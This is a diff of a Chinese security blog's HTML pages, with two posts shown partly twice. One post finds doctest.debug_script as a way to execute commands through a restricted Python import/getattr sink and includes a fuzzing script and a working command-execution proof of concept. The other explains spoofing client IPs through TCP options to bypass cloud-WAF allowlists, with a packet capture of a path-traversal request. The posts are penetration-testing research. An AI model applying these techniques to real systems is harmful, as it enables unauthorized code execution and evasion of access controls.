user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
-
-<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
-<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
-<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
-<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
-
-<p>结果测出很多函数都可以正常运行，没有报错。</p>
-<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
-<p>测试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
-
-<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
-<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
 
       
     </div>
@@ -470,126 +684,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/" class="post-title-link" itemprop="url">WAF攻防实践(5)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到: 攻击者可以利用”TOA模块”伪造客户端ip，如果厂商有ip白名单，攻击者就有可能绕过WAF的防护。</p>
-<p>按照我的理解，因为这种攻击方式可以用来伪造源ip，所以它不仅可以用来绕过WAF，还适用于”存在白名单ip防御措施”的场景，比如当后台管理系统只能”白名单ip”访问。</p>
-<p>当然这种绕过方式也有一定的前置条件，而且我感觉满足条件的攻击场景应该不多，所以这种绕过方式出现概率应该不高。</p>
-<p>建议读者先看一下原文的六页ppt，再来看我这篇”学习总结”。相比于原文，我补充了”测试脚本”和”测试时需要注意的两个小坑”，希望能节约读者测试验证时花费的时间。</p>
-<p>本文主要研究以下问题：</p>
-<ul>
-<li>TOA是什么？</li>
-<li>怎么测试目标是否存在这类问题？</li>
-</ul>
-<p>我在这个案例学到了一些小的知识点：</p>
-<ul>
-<li>tcp报文的options字段的格式</li>
-<li>企业中怎么获取真实 client ip</li>
-<li>怎么用scapy发送带seq、ack序号的报文</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>TOA是什么？</p>
-<p>是”TCP_option_address”的缩写；它和”X-Forwarded-For”一样，可以用来传递真实的”客户端ip”。</p>
-<blockquote>
-<p>两者的区别在于：”X-Forwarded-For”工作在”应用层”，”TOA”工作在”tcp层”</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hollake/article/details/89327474">Tcp Options字段</a>可以包含<em>不固定数量</em>个下面这样的数据结构：</p>
-<blockquote>
-<p>Kind(1字节)   |  Length(1字节,可选)  | Info(n字节,可选)</p>
-</blockquote>
-<p><img src="https://user-images.githubusercontent.com/1846319/129451573-252bb058-f3db-40ef-abe1-001863eb1b81.png" alt="image"></p>
-</li>
-</ul>
-<ul>
-<li><p>怎么用”TOA”实现传递客户端ip呢？</p>
-<p>有”转发服务”和”后端真实服务器”两个角色。</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/129451679-2e631ddf-c1b0-433a-afbe-fedc777fb9b2.png" alt="image"></p>
-<p>“转发服务”在tcp包的options字段塞入真实的”客户端ip”。</p>
-<p>在”后端真实服务器”安装一些”内核模块”后，应用程序就可以用getpeername、accept等系统调用拿到真实的”客户端ip”。这些”内核模块”(比如<a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>)hook了用来接受包的内核函数。当收到数据包时，它们会遍历tcp包的options字段，然后取出真实的”客户端ip”，最终返回给应用层。</p>
-</li>
-<li><p>怎么绕过WAF？</p>
-<p>在云waf架构中，一个http请求的数据流是：客户端(浏览器) -&gt; 转发服务(bgw) -&gt; waf检测集群 -&gt; 源站。</p>
-<p>其中waf检测集群拿到的”客户端ip”是”转发服务”处理后的。</p>
-<p>如果客户端发包时在tcp包的options字段加入伪造的客户端ip和端口，且”转发服务”没有检查tcp包的options字段中是否有伪造的”客户端ip”，就会导致”waf检测集群”拿到伪造的客户端ip和端口。</p>
-<p>如果有对来源ip做白名单机制，就会存在绕过。</p>
-</li>
-<li><p>怎么测试目标是否存在这类问题？</p>
-<p>针对云waf可以这么测试：客户端发攻击包同时伪造来源ip，然后在控制台查看拦截日志。如果拦截日志中的攻击源ip不是真实ip，就说明存在问题。</p>
-<p>客户端发包代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/03bc78c6d6badaa5a80eddf684bccf0e">gist</a></p>
-<p>其中有两点需要注意：</p>
-<blockquote>
-<p>系统收到服务端的syn-ack包时，因为网络连接不存在，所以会回复一个rst包。这会影响测试，因此测试前要屏蔽掉回复的rst包。</p>
-<p>在伪造ip时，tcp options需要和测试目标”后端真实服务器”用的数据结构相同。这个数据结构可以参考 <a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>。</p>
-</blockquote>
-<p>另外建议在客户端抓包看下流量是否符合预期，以下是我测试时抓包的数据，可以看到tcp options字段已经有了我设置的”kind是238的数据”。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump host 120.92.15.189</span><br><span class="line">...</span><br><span class="line">17:27:08.411615 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [S], seq 0, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.462963 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [S.], seq 4179803533, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.496708 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [.], seq 1:50, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 49: HTTP: GET &#x2F;?a&#x3D;..&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1</span><br><span class="line">17:27:08.548138 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], ack 50, win 29200, length 0</span><br><span class="line">17:27:08.550722 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], seq 1:513, ack 50, win 29200, length 512: HTTP: HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>厂商只要转发包时，抹去所有tcp options字段 或者 检查tcp opitons有没有奇怪的kind，就可以避免这个问题，这也是我觉得这种问题出现概率不高的原因。我没有对很多厂商做测试，如果大家有啥新发现，可以公众号后台私信我。</p>
-<p>另外我把数据包文件放在了<a target="_blank" rel="noopener" href="https://github.com/leveryd/picture/blob/main/test.pcap">test.pcap</a>，如果对tcp options格式字段有疑问，就可以用wireshark打开数据包看看。</p>
-<p>留给读者一个问题：nmap -S 参数也能伪造源ip，它和本文这种方式有什么区别呢？</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -710,6 +804,126 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/" class="post-title-link" itemprop="url">WAF攻防实践(5)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到: 攻击者可以利用”TOA模块”伪造客户端ip，如果厂商有ip白名单，攻击者就有可能绕过WAF的防护。</p>
+<p>按照我的理解，因为这种攻击方式可以用来伪造源ip，所以它不仅可以用来绕过WAF，还适用于”存在白名单ip防御措施”的场景，比如当后台管理系统只能”白名单ip”访问。</p>
+<p>当然这种绕过方式也有一定的前置条件，而且我感觉满足条件的攻击场景应该不多，所以这种绕过方式出现概率应该不高。</p>
+<p>建议读者先看一下原文的六页ppt，再来看我这篇”学习总结”。相比于原文，我补充了”测试脚本”和”测试时需要注意的两个小坑”，希望能节约读者测试验证时花费的时间。</p>
+<p>本文主要研究以下问题：</p>
+<ul>
+<li>TOA是什么？</li>
+<li>怎么测试目标是否存在这类问题？</li>
+</ul>
+<p>我在这个案例学到了一些小的知识点：</p>
+<ul>
+<li>tcp报文的options字段的格式</li>
+<li>企业中怎么获取真实 client ip</li>
+<li>怎么用scapy发送带seq、ack序号的报文</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>TOA是什么？</p>
+<p>是”TCP_option_address”的缩写；它和”X-Forwarded-For”一样，可以用来传递真实的”客户端ip”。</p>
+<blockquote>
+<p>两者的区别在于：”X-Forwarded-For”工作在”应用层”，”TOA”工作在”tcp层”</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hollake/article/details/89327474">Tcp Options字段</a>可以包含<em>不固定数量</em>个下面这样的数据结构：</p>
+<blockquote>
+<p>Kind(1字节)   |  Length(1字节,可选)  | Info(n字节,可选)</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/1846319/129451573-252bb058-f3db-40ef-abe1-001863eb1b81.png" alt="image"></p>
+</li>
+</ul>
+<ul>
+<li><p>怎么用”TOA”实现传递客户端ip呢？</p>
+<p>有”转发服务”和”后端真实服务器”两个角色。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/129451679-2e631ddf-c1b0-433a-afbe-fedc777fb9b2.png" alt="image"></p>
+<p>“转发服务”在tcp包的options字段塞入真实的”客户端ip”。</p>
+<p>在”后端真实服务器”安装一些”内核模块”后，应用程序就可以用getpeername、accept等系统调用拿到真实的”客户端ip”。这些”内核模块”(比如<a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>)hook了用来接受包的内核函数。当收到数据包时，它们会遍历tcp包的options字段，然后取出真实的”客户端ip”，最终返回给应用层。</p>
+</li>
+<li><p>怎么绕过WAF？</p>
+<p>在云waf架构中，一个http请求的数据流是：客户端(浏览器) -&gt; 转发服务(bgw) -&gt; waf检测集群 -&gt; 源站。</p>
+<p>其中waf检测集群拿到的”客户端ip”是”转发服务”处理后的。</p>
+<p>如果客户端发包时在tcp包的options字段加入伪造的客户端ip和端口，且”转发服务”没有检查tcp包的options字段中是否有伪造的”客户端ip”，就会导致”waf检测集群”拿到伪造的客户端ip和端口。</p>
+<p>如果有对来源ip做白名单机制，就会存在绕过。</p>
+</li>
+<li><p>怎么测试目标是否存在这类问题？</p>
+<p>针对云waf可以这么测试：客户端发攻击包同时伪造来源ip，然后在控制台查看拦截日志。如果拦截日志中的攻击源ip不是真实ip，就说明存在问题。</p>
+<p>客户端发包代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/03bc78c6d6badaa5a80eddf684bccf0e">gist</a></p>
+<p>其中有两点需要注意：</p>
+<blockquote>
+<p>系统收到服务端的syn-ack包时，因为网络连接不存在，所以会回复一个rst包。这会影响测试，因此测试前要屏蔽掉回复的rst包。</p>
+<p>在伪造ip时，tcp options需要和测试目标”后端真实服务器”用的数据结构相同。这个数据结构可以参考 <a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>。</p>
+</blockquote>
+<p>另外建议在客户端抓包看下流量是否符合预期，以下是我测试时抓包的数据，可以看到tcp options字段已经有了我设置的”kind是238的数据”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump host 120.92.15.189</span><br><span class="line">...</span><br><span class="line">17:27:08.411615 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [S], seq 0, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.462963 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [S.], seq 4179803533, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.496708 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [.], seq 1:50, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 49: HTTP: GET &#x2F;?a&#x3D;..&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1</span><br><span class="line">17:27:08.548138 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], ack 50, win 29200, length 0</span><br><span class="line">17:27:08.550722 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], seq 1:513, ack 50, win 29200, length 512: HTTP: HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>厂商只要转发包时，抹去所有tcp options字段 或者 检查tcp opitons有没有奇怪的kind，就可以避免这个问题，这也是我觉得这种问题出现概率不高的原因。我没有对很多厂商做测试，如果大家有啥新发现，可以公众号后台私信我。</p>
+<p>另外我把数据包文件放在了<a target="_blank" rel="noopener" href="https://github.com/leveryd/picture/blob/main/test.pcap">test.pcap</a>，如果对tcp options格式字段有疑问，就可以用wireshark打开数据包看看。</p>
+<p>留给读者一个问题：nmap -S 参数也能伪造源ip，它和本文这种方式有什么区别呢？</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-old_link/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -749,6 +963,183 @@
     <div class="post-body" itemprop="articleBody">
           <p>2017-2019年的历史文章，共8篇</p>
 <p><a target="_blank" rel="noopener" href="https://leveryd.github.io/">https://leveryd.github.io/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
+<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
+
+<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
+<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
+<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
+<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+
